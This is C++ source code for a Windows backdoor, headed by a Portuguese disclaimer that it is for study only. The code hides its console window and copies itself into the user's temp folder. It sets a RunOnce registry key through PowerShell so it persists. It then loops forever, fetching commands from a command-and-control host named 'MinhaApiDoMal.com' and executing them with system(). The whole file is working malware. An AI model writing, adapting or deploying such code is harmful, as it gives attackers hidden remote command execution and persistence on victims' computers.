/*

Este programa foi criado com a finalidade de estudo somente.
Seu mau uso não é de minha responsabilidade.

*/
#include <winsock2.h>
#include <Lmcons.h>
#include <iostream>
#include <dirent.h>
using namespace std;
#pragma comment(lib,"ws2_32.lib")
void MalwareRun();
string HttpGet(string url,string urlAction)
{

  WSADATA wsaData;
  SOCKET Socket;
  SOCKADDR_IN SockAddr;
  int lineCount=0;
  int rowCount=0;
  struct hostent *host;
  locale local;
  char buffer[10000];
  int i = 0 ;
  int nDataLength;
  string website_HTML;
  string get_http;
  
  if(urlAction == " ")
  {
    get_http = "GET HTTP/1.1\r\nHost: " + url + "\r\nConnection: close\r\n\r\n";
  }
  else
  {
    get_http = "GET "+ urlAction +" HTTP/1.1\r\nHost: " + url + "\r\nConnection: close\r\n\r\n";
  }
  
      if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0)
      {
          return "error";
      }
	  
      Socket=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
      host = gethostbyname(url.c_str());

      SockAddr.sin_port=htons(80);
      SockAddr.sin_family=AF_INET;
      SockAddr.sin_addr.s_addr = *((unsigned long*)host->h_addr);

      if(connect(Socket,(SOCKADDR*)(&SockAddr),sizeof(SockAddr)) != 0)
      {
          return "error";
      }

      send(Socket,get_http.c_str(), strlen(get_http.c_str()),0 );

      while ((nDataLength = recv(Socket,buffer,10000,0)) > 0){
          int i = 0;
          while (buffer[i] >= 32 || buffer[i] == '\n' || buffer[i] == '\r'){

              website_HTML+=buffer[i];
              i += 1;
          }
      }

      closesocket(Socket);
      WSACleanup();
      return website_HTML;
}
string DeserializeJson(string parameter,string htmlResponse)
{
  int initParameter;
  string parameterDeserialize;

  int htmlResponseLenght = htmlResponse.length();
  char char_arrayHtmlResponse[htmlResponseLenght + 1];
  strcpy(char_arrayHtmlResponse, htmlResponse.c_str());

  int parameterLenght = parameter.length();
  char char_arrayParameter[parameterLenght + 1];
  strcpy(char_arrayParameter, parameter.c_str());

    for (int i = 0; i < htmlResponseLenght; i++)
    {
      if(char_arrayHtmlResponse[i] == char_arrayParameter[0]
        && char_arrayHtmlResponse[i+1] == char_arrayParameter[1]
        && char_arrayHtmlResponse[i-1] == '"')
     {
       if(char_arrayHtmlResponse[i+parameterLenght+3] = ' ')
       {
         initParameter = i+parameterLenght+4;
       }
       else
       {
         initParameter = i+parameterLenght+3;
       }
       while(char_arrayHtmlResponse[initParameter] != '"')
       {
         parameterDeserialize += char_arrayHtmlResponse[initParameter];
         initParameter++;
       }
       break;
     }
   }
 return parameterDeserialize;
}
void Malware()
{
  string url = "MinhaApiDoMal.com";
  string urlTokenAction = "/generatetoken.php";

  string apiToken = DeserializeJson("token",HttpGet(url,urlTokenAction));
  string urlActionCommand = ("/getcommand.php?token="+apiToken);

  while(true)
  {
    try
    {
      string command = DeserializeJson("commands",HttpGet(url,urlActionCommand));
      string timeStr = DeserializeJson("time",HttpGet(url,urlActionCommand));
      if(command != "error" && timeStr != "error")
      {
        int time = stoi(timeStr);
        system(command.c_str());
        Sleep(time);
      }
    }
    catch (exception ex)
    {
      continue;
    }
  }
}

string current_working_directory()
{
  char* cwd = _getcwd( 0, 0 ) ;
  string working_directory(cwd) ;
  free(cwd) ;
  return working_directory ;
}
void InitConfig(string programName)
{
  HWND window;
  AllocConsole();
  window = FindWindowA("ConsoleWindowClass", NULL);
  ShowWindow(window,0);
  char username[UNLEN+1];
  DWORD username_len = UNLEN+1;
  GetUserName(username, &username_len);
  string pathUsers = "C:\\Users\\";
  string pathTarget = "\\appdata\\local\\temp\\main.exe";
  string input = current_working_directory()+"\\"+programName;
  string output = pathUsers+username+pathTarget;
  CopyFile(input.c_str(),output.c_str(), TRUE);
  string commandPowerShell = "powershell New-ItemProperty -Path HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce -name Main -Value "+output+" -force";
  system(commandPowerShell.c_str());
}
int main(int argc,char *argv[])
{
    InitConfig(argv[0]);
    Malware();
    return 0;
}
